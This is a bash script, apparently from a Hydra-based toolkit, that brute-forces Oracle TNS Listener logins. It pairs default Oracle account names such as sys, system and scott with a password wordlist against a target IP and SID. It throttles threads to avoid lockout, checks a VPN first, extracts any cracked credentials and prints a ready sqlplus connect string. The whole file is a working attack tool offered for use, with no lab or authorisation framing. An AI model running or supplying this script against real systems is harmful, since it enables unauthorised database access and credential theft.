#!/bin/bash

# Oracle Database Attack Script
# Description: Attacks Oracle databases (TNS Listener)
# Usage: Edit TARGET variable and run

set -euo pipefail

# ============================================
# CONFIGURATION - EDIT ONLY THESE LINES
# ============================================
TARGET="192.168.1.100"  # <-- Change this to your Oracle server IP
SID="ORCL"              # <-- Change this to your Oracle SID (ORCL, XE, etc.)

# ============================================
# DO NOT EDIT BELOW THIS LINE
# ============================================

# Colors
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m'

# Configuration
PROJECT_ROOT="$(cd "$(dirname "${BASH_SOURCE[0]}")/.." && pwd)"
WORDLIST="${PROJECT_ROOT}/config/admin_passwords.txt"
PORT=1521  # Oracle TNS Listener default port
THREADS=4  # Oracle is sensitive to connection floods
LOG_FILE="${HOME}/hydra-logs/oracle_$(date +%Y%m%d_%H%M%S).log"

# Common Oracle usernames
ORACLE_USERS="sys system scott hr dbsnmp sysman"

# Banner
echo -e "${BLUE}"
echo "╔════════════════════════════════════════╗"
echo "║   Oracle Database Attack              ║"
echo "║   Target: $TARGET:$PORT"
echo "║   SID: $SID"
echo "╚════════════════════════════════════════╝"
echo -e "${NC}"

# Check VPN
if [ -f "${PROJECT_ROOT}/scripts/vpn_check.sh" ]; then
    bash "${PROJECT_ROOT}/scripts/vpn_check.sh" || {
        echo -e "${YELLOW}[!] VPN not active${NC}"
        exit 1
    }
fi

# Check hydra
if ! command -v hydra &> /dev/null; then
    echo -e "${RED}[!] Hydra not found. Run: bash install.sh${NC}"
    exit 1
fi

# Check wordlist
if [ ! -f "$WORDLIST" ]; then
    echo -e "${RED}[!] Wordlist not found: $WORDLIST${NC}"
    exit 1
fi

# Create temporary Oracle users file
TEMP_USERS=$(mktemp)
trap 'rm -f "$TEMP_USERS"' EXIT ERR

echo "$ORACLE_USERS" | tr ' ' '\n' > "$TEMP_USERS"

# Create log directory
mkdir -p "$(dirname "$LOG_FILE")"

echo -e "${BLUE}[*] Starting Oracle attack...${NC}"
echo -e "${BLUE}[*] Target: $TARGET:$PORT${NC}"
echo -e "${BLUE}[*] SID: $SID${NC}"
echo -e "${BLUE}[*] Testing users: $ORACLE_USERS${NC}"
echo -e "${BLUE}[*] Threads: $THREADS (low to avoid lockout)${NC}"

# Run hydra attack
hydra -L "$TEMP_USERS" -P "$WORDLIST" \
    -t "$THREADS" \
    -s "$PORT" \
    -f \
    -o "$LOG_FILE" \
    -m "$SID" \
    "$TARGET" \
    oracle-listener 2>&1 | while IFS= read -r line; do
    
    echo "$line"
    
    if echo "$line" | grep -q "login:"; then
        username=$(echo "$line" | sed -n 's/.*login: \([^ ]*\).*/\1/p')
        password=$(echo "$line" | sed -n 's/.*password: \(.*\)/\1/p')
        
        echo -e "${GREEN}[+] SUCCESS! Oracle credentials found:${NC}"
        echo -e "${GREEN}    Username: $username${NC}"
        echo -e "${GREEN}    Password: $password${NC}"
        echo -e "${GREEN}    SID: $SID${NC}"
        echo -e "${GREEN}[+] Connect: sqlplus $username/$password@$TARGET:$PORT/$SID${NC}"
        
        if [ -f "${PROJECT_ROOT}/scripts/logger.sh" ]; then
            source "${PROJECT_ROOT}/scripts/logger.sh"
            save_result "oracle" "$TARGET" "$PORT" "$username" "$password"
        fi
    fi
done

echo -e "${GREEN}[+] Attack completed!${NC}"
echo -e "${BLUE}[*] Results saved to: $LOG_FILE${NC}"
